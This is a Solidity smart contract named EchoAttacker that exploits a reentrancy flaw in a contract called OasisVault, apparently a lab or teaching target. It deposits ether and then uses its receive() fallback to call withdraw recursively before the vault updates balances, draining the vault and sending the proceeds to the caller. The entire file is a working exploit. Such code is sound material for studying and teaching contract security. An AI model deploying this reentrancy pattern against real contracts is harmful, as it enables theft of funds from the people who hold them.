// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// EchoAttacker exploits the reentrancy vulnerability in OasisVault.
// The attacker calls withdraw recursively, echoing back into the vault
// before the balance is updated, draining it dry.

import "./OasisVault.sol";

contract EchoAttacker {
    OasisVault public oasisVault;

    constructor(address _oasisVaultAddress) {
        oasisVault = OasisVault(_oasisVaultAddress);
    }

    // Fallback function to receive Ether and trigger the reentrancy attack
    receive() external payable {
        if (address(oasisVault).balance >= 1 ether) {
            oasisVault.withdraw(1 ether);
        }
    }

    // Function to start the attack by depositing some Ether into the vault
    function attack() public payable {
        require(msg.value >= 1 ether, "You need to send at least 1 Ether to start the attack");
        oasisVault.deposit{value: msg.value}();
        oasisVault.withdraw(1 ether);
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
